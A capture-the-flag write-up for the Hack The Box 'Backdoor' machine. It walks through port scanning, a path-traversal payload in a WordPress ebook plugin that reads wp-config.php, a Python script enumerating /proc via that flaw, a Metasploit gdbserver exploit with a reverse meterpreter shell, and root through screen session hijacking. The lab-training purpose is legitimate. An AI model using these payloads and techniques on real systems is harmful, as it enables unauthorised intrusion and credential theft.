---
description: By htb.
---

# Backdoor

![image](https://user-images.githubusercontent.com/56447720/142755520-3cfea3f5-27b9-4c33-9e77-3e4457aa6ddf.png)

### Initial Enumeration

**Nmap Scan**

```bash
└─$ nmap -p- 1337,80,22 backdoor.htb -sC -sV
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-21 15:24 IST
Nmap scan report for backdoor.htb (10.129.236.8)
Host is up (0.34s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.00 seconds
```

### Directory Listing

```bash
└─$ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://backdoor.htb/wp-content/FUZZ -c                         

________________________________________________

 :: Method           : GET
 :: URL              : http://backdoor.htb/wp-content/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
wp-admin                [Status: 301, Size: 315, Words: 20, Lines: 10]
wp-content              [Status: 301, Size: 317, Words: 20, Lines: 10]
wp-includes             [Status: 301, Size: 318, Words: 20, Lines: 10]
:: Progress: [20469/20469] :: Job [1/1] :: 160 req/sec :: Duration: [0:02:14] :: Errors: 0 ::

```

* The `wp-admin` directory lands you to a wordpress login page, I tried cracking the password with rockyou.txt but failed
* The `wp-content` directory had nothing, so I further `ffuf` it go see more directoires in it

**Wp-content**

```bash
└─$ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://backdoor.htb/wp-content/FUZZ -c 
    
________________________________________________

 :: Method           : GET
 :: URL              : http://backdoor.htb/wp-content/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
plugins                 [Status: 301, Size: 325, Words: 20, Lines: 10]
themes                  [Status: 301, Size: 324, Words: 20, Lines: 10]
upgrade                 [Status: 301, Size: 325, Words: 20, Lines: 10]
uploads                 [Status: 301, Size: 325, Words: 20, Lines: 10]

:: Progress: [20469/20469] :: Job [1/1] :: 160 req/sec :: Duration: [0:02:14] :: Errors: 0 ::
```

*   The plugins directory is quiet intresting

    ![image](https://user-images.githubusercontent.com/56447720/142757950-719f874f-6535-4605-a28b-2d8c2b988e83.png)
* After messing around on web I found this exploit link : https://www.exploit-db.com/exploits/39575
* Payload : `http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php`

![image](https://user-images.githubusercontent.com/56447720/142758211-612714fb-2d69-4f5e-ad67-a407a82a4e3f.png)

![image](https://user-images.githubusercontent.com/56447720/142758317-b4f84315-4750-4047-be22-03e1e0200fa3.png)

### Iniital Foothold

* I tried getting the `id_rsa` with LFI but the `user` directory didn't have any ssh keys
* The port 1337 had `?waste` service which nmap said ( NOTE : `?waste` wasn't the service running on port 1337 )
* Let's check what service that port had
* I read the man page for proc and found `/cmdline` intresting which tells sumary about a service
* Man page of `proc` : https://man7.org/linux/man-pages/man5/proc.5.html
* I didn't found any exploits that shows services , so I made one

**Check Services**

*   Exploit.py

    ```py
    import requests

    url = 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl='
    pl = []
    start = 900 # The service was on 956 for me, if you didn't found the service try changing the start point
    for i in range(start,1010):  
        pl.append(f'{url}../../../../../../../../../../../../../../../proc/{i}/cmdline')

    for i in pl:
        r = requests.get(i)
        check = r.text
        if '1337' in check:
            print(check)
            print('SERVICE SUCCESSFULLY FOUND')
            break
        else:
            print(f'trying on /proc/{start}/cmdline')
            start+=1
    ```
* Output.txt

```bash
../../../../../../../../../../../../../../../proc/956/cmdline
../../../../../../../../../../../../../../../proc/956/cmdline
../../../../../../../../../../../../../../../proc/956/cmdline

/bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done

<script>window.close()</script>

```

* So the `port 1337` is running a `gdbserver`

![image](https://user-images.githubusercontent.com/56447720/142758972-3707c8b8-2ef8-4433-9b71-8044675135e3.png)

* Link : https://www.rapid7.com/db/modules/exploit/multi/gdb/gdb\_server\_exec/

## User Shell

* Use this `msf exploit` to get the user shell : `use exploit/multi/gdb/gdb_server_exec`

```bash
msf6 exploit(multi/gdb/gdb_server_exec) > set lhost 10.10.14.76
lhost => 10.10.14.76
msf6 exploit(multi/gdb/gdb_server_exec) > set rhosts <IP OF THE MACHINE>

msf6 exploit(multi/gdb/gdb_server_exec) > set target 1
target => 1
msf6 exploit(multi/gdb/gdb_server_exec) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/gdb/gdb_server_exec) > set rport 1337
rport => 1337

```

* Exploiting it gets us to `<meterpreter>` , to get a proper shell use `shell` command
* And we have the user shell
* `python3 -c "import pty;pty.spawn('/bin/bash')"`

```bash
user@Backdoor:~$ id
id
uid=1000(user) gid=1000(user) groups=1000(user)

user@Backdoor:~$ cat user.txt
<--SNIPPED-->
```

### Privilege Escalation

**Linpeas**

```bash
root         937  0.0  0.1   8356  3420 ?        S    07:15   0:00  _ /usr/sbin/CRON -f
root         954  0.0  0.0   2608  1596 ?        Ss   07:15   0:02      _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec s
```

* The screen service is running at root privileges

## **Root Shell**

```bash
user@Backdoor:~$ /usr/bin/screen -h

-h lines      Set the size of the scrollback history buffer.
-i            Interrupt output sooner when flow control is on.
-l            Login mode on (update /var/run/utmp), -ln = off.
-ls [match]   or
-list         Do nothing, just list our SockDir [on possible matches].
-L            Turn on output logging.
-Logfile file Set logfile name.
-m            ignore $STY variable, do create a new screen session.
-O            Choose optimal output rather than exact vt100 emulation.
-p window     Preselect the named window if it exists.
-q            Quiet startup. Exits with non-zero return code if unsuccessful.
-Q            Commands will send the response to the stdout of the querying process.
-r [session]  Reattach to a detached screen process.
-R            Reattach if possible, otherwise start a new session.
-s shell      Shell to execute rather than $SHELL.
-S sockname   Name this session <pid>.sockname instead of <pid>.<tty>.<host>.
-t title      Set title. (window's name).
-T term       Use term as $TERM for windows, rather than "screen".
-U            Tell screen to use UTF-8 encoding.
-v            Print "Screen version 4.08.00 (GNU) 05-Feb-20".
-wipe [match] Do nothing, just clean up SockDir [on possible matches].
-x            Attach to a not detached screen. (Multi display mode).
-X            Execute <cmd> as a screen command in the specified session.

```

* So as there were no exploits available on the internet we have to play with the flags
* I tried to exploit with help of GTFO bins and some flags around here
* So we can get root shell with the `-x` flag : `-x UserYouWannaHijackSession / HisSessionName`

### **Shell**

```bash
user@Backdoor:~$ /usr/bin/screen -x root/root
/usr/bin/screen -x root/root

root@Backdoor:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@Backdoor:~# cat /root/root.txt
<--SNIPPED-->
```

* If you didn't get the shell or some error like `Please set a terminal type.` use this command `export TERM=xterm`

**Box pwned**

![image](https://user-images.githubusercontent.com/56447720/143611602-d17a27c8-6c0c-4321-a196-aacaf50c8a97.png)
